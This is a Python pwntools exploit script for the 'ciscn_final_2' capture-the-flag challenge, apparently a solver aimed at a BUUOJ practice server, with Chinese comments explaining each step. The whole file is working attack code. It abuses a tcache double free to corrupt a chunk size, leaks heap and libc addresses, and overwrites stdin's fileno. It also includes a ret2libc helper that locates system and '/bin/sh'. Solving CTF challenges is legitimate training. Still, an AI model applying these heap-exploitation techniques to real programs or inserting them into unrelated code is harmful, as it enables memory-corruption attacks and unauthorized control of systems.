from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './ciscn_final_2'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',25031) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
libc = ELF('/home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so')
# patchelf --set-interpreter /lib64/2_27-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件

def bytes2int(content):
	return str(content,encoding='utf-8')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(choice,content=b'a'):
    sla(b'>',b'1')
    sla(b'>',int2bytes(choice))
    sa(b':',int2bytes(content))

def show(choice):
    sla(b'>',b'3')
    sla(b'>',int2bytes(choice))

def leave(content=b'a'):
    sla(b'>',b'4')
    sa(b'what do you want to say at last? ',content)

def delete(choice):
    sla(b'>',b'2')
    sla(b'>',int2bytes(choice))

# *((_DWORD *)int_pt + 2) = *(_DWORD *)int_pt;
# 这句和下面那个短int类似的语句都很关键，一开始我不理解是什么意思，以为是赋值地址的意思，
# 后来发现在修改size过程调试了一下发现add所给的int和short都是只输入一次但chunk存在两个值，
# 查了下word和dword类型还是不理解为什么是2和4，觉得应该是1和3，后来突然意识到这里是小端序，
# 所以int是【空(1号位置)，0x90909090(0号位置)】【空(3号位置)，0x90909090(2号位置)】，
# short类似，所以这里两条语句就代表给chunk里面的内容赋值两次

add(1,0x90909090)#1 -- fake chunk（被篡改size的chunk）
delete(1)
#double free
add(2,0x9090)#2
add(2,0x9090)#2
add(2,0x9090)#2
add(2,0x9090)#2
delete(2)
add(1,0x90909090)#1
delete(2)
show(2)
ru(b':')
heap_low_2bit = int(ru('\n',drop=1))&0xffff #泄露heap的低2字节
log.success('heap_low_2bit  '+hex(heap_low_2bit))
# add(1,0x90909090)#1
# delete(2)#其实这里这个delete也可以没有，只是delete两次但是需要add三次会导致这个tache的count变成-1（非常大）然后直接报废

#tcache attack 篡改size
add(2,heap_low_2bit-0xa0) #因为唯一的一个chunk 1 后面跟了两个chunk 2，为了正好修改第二个chunk 2的size所以+0x40
add(2,0)
add(2,0x91)

#用被篡改size的chunk 1填充tcache
for i in range(7):
	delete(1)
	add(2,0x9090)

#leak
delete(1)
show(1)
ru(b':')
libc_low_4bit = int(ru('\n',drop=1))&0xffffffff #泄露libc的低两字节
log.success('libc_low_4bit  '+hex(libc_low_4bit))
base = libc_low_4bit - 96 - 0x10 - libc.sym['__malloc_hook']
fileno = base + libc.sym['_IO_2_1_stdin_'] + 0x70 #0x70是fileno在_FILE结构体中的偏移
log.success('fileno  '+hex(fileno))

#从unsortedbin中切一个0x30出来，会附带~libc的残留数据,
# 因为我们只能赋值低四位或低两位所以必须利用libc残留地址的高位
add(1,fileno)

#double free
add(1,0x90909090)#仍然是unsortedbin切分出的——注意地址（用于计算下面-0x30）
delete(1)
add(2,0x9090)
delete(1)
show(1)
ru(b':')
heap_low_4bit = int(ru('\n',drop=1))&0xffffffff #泄露heap的低4字节
log.success('heap_low_4bit  '+hex(heap_low_4bit))

#注意这里要add四次而非上面的三次，因为两个目的不同，上面只是为了到达heap_low_2bit-0xa0然后覆写
#这里是讲heap_low_4bit-0x30作为跳板，到达heap_low_4bit-0x30->fd即fileno然后覆写
add(1,heap_low_4bit-0x30)
add(1,0)
add(1,0x90909090)
add(1,666)

leave()
# end

itr()